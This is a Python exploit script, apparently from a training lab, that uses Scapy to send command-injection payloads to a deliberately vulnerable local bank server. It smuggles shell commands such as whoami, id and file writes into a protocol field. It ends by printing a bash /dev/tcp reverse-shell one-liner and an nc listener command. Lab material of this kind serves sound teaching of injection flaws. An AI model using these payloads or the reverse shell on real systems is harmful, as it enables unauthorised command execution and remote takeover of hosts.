#!/usr/bin/env python3
"""
ScapyCOBOLBankLab - Exploit Demo

Demonstrates command injection using Scapy against the vulnerable bank server.
Run the server first with: just start-server
"""

from scapy.all import *
import sys

TARGET = "127.0.0.1"
TARGET_PORT = 9999

Colors = {
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'end': '\033[0m',
}

def c(color, text):
    return Colors.get(color, '') + str(text) + Colors.get('end', '')

def inject_command(command, description):
    """Send a malicious command to the bank server."""
    payload = f"BANKCMD|RUN|X|X|{command}|\n"

    print(f"\n{c('yellow', '[*]')} {description}")
    print(f"{c('blue', '    Payload:')} {payload.strip()}")

    packet = IP(dst=TARGET) / TCP(dport=TARGET_PORT, flags="PA") / payload.encode()

    try:
        send(packet, verbose=0, timeout=2)
        print(f"{c('green', '[+]')} Sent!")
    except Exception as e:
        print(f"{c('red', '[ERROR]')} {e}")

def main():
    print(c('blue', "[[ SCAPY COBOL BANK EXPLOIT DEMO ]]"))
    print(f"Target: {TARGET}:{TARGET_PORT}")
    print("=" * 50)

    # Wait for user to start server
    input(c('yellow', '\n[!] Press Enter after starting the server (just start-server)...\n'))

    # Demo exploits
    exploits = [
        ("whoami", "Basic command execution - show current user"),
        ("id", "Show user and group IDs"),
        ("uname -a", "Show system information"),
        ("ls -la /tmp/banklab", "List files in our demo directory"),
        ("cat /tmp/banklab/hello.sh", "Read a demo script"),
        ("/tmp/banklab/hello.sh", "Execute a demo script"),
        ("echo 'pwned' > /tmp/banklab/pwned.txt", "Create a file"),
        ("whoami; id; hostname", "Command chaining with semicolons"),
    ]

    print(c('green', "\n[*] Running exploit sequence...\n"))

    for cmd, desc in exploits:
        inject_command(cmd, desc)
        time.sleep(1)

    print(c('green', "\n[+] Done! Check the server output to see executed commands.\n"))

    print(c('yellow', "[!] For reverse shell, use your own IP:"))
    print(c('blue', "    bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"))
    print(c('yellow', "    Then: nc -lvnp 4444\n"))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(c('red', "\n\n[!] Interrupted"))
        sys.exit(0)
